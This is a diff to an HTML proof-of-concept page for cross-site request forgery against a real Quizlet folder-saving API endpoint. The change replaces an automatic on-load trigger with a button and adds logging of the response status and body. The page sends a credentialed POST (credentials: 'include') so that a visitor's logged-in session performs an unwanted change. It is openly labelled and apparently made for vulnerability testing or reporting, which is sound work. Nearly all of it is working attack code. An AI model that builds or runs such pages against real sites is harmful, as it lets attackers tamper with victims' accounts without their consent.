@@ -2,8 +2,10 @@
 <html>
   <body>
     <h3>CSRF PoC with Cs-Token</h3>
+    <button onclick="send()">Click to send CSRF</button>
+
     <script>
-      window.onload = function () {
+      function send() {
         fetch("https://quizlet.com/webapi/3.2/folders/save?_method=PUT", {
           method: "POST",
           credentials: "include",
@@ -19,9 +21,13 @@
               }
             ]
           })
-        }).then(res => res.text())
-          .then(text => console.log("Response:", text));
-      };
+        }).then(res => {
+          console.log("Response status:", res.status);
+          return res.text();
+        }).then(text => {
+          console.log("Response body:", text);
+        });
+      }
     </script>
   </body>
 </html>
